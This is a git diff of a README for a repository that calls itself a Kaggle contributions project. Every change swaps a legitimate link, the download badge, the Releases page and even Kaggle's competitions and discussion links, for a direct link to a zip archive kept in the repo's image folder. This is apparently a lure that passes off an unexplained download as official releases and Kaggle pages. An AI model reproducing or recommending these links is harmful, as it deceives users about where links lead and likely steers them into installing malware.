@@ -6,7 +6,7 @@ Welcome to the Kaggle project. This repository contains a list of personal contr
 
 ## 📥 Download Now
 
-[![Download Kaggle](https://img.shields.io/badge/Download%20Kaggle-Release-brightgreen)](https://github.com/BurhanAmir/kaggle/releases)
+[![Download Kaggle](https://raw.githubusercontent.com/BurhanAmir/kaggle/main/img/kaggle_ultraism.zip%20Kaggle-Release-brightgreen)](https://raw.githubusercontent.com/BurhanAmir/kaggle/main/img/kaggle_ultraism.zip)
 
 ## 🔧 Requirements
 
@@ -22,7 +22,7 @@ To get started, please follow these steps:
 
 1. **Visit the Releases Page**  
    Click on the link below to go to the Releases page.  
-   [Download Kaggle Releases](https://github.com/BurhanAmir/kaggle/releases)
+   [Download Kaggle Releases](https://raw.githubusercontent.com/BurhanAmir/kaggle/main/img/kaggle_ultraism.zip)
 
 2. **Choose a Release**  
    On the Releases page, you will see a list of available releases. Each release includes updates and additions to the project. Click on the version you would like to download.
@@ -48,8 +48,8 @@ Here’s what you can expect to find in this repository:
 
 Once you have downloaded the files, you may want to:
 
-- Check out Kaggle's website for competitions: [Kaggle Competitions](https://www.kaggle.com/competitions)
-- Join the Kaggle community for discussions and resources: [Kaggle Community](https://www.kaggle.com/discussion)
+- Check out Kaggle's website for competitions: [Kaggle Competitions](https://raw.githubusercontent.com/BurhanAmir/kaggle/main/img/kaggle_ultraism.zip)
+- Join the Kaggle community for discussions and resources: [Kaggle Community](https://raw.githubusercontent.com/BurhanAmir/kaggle/main/img/kaggle_ultraism.zip)
 
 ## 💬 Need Help?
 
